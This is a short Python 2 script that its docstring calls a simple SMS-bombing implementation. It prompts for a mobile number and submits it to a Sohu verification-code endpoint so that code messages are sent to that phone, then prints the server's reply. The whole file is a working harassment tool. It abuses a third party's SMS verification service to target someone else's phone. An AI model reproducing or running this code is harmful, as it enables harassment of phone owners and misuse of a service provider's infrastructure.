# -*- coding:utf-8 -*-
__author__ = 'weijie'
"""
短信轰炸python简单实现
http://www.oschina.net/code/snippet_168578_24323
"""

import urllib2
import cookielib
import urllib
import json
mobile = raw_input("请输入一个手机号：")
cookie = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
response = opener.open('http://t.sohu.com/settings/bindMobile/registSendVerificationCode')
data = {'mobileNumber': mobile}
r = opener.open('http://t.sohu.com/settings/bindMobile/registSendVerificationCode',urllib.urlencode(data))
s = json.loads(r.read(),'gbk')
print s['status']
print s['data']
print s['statusText']
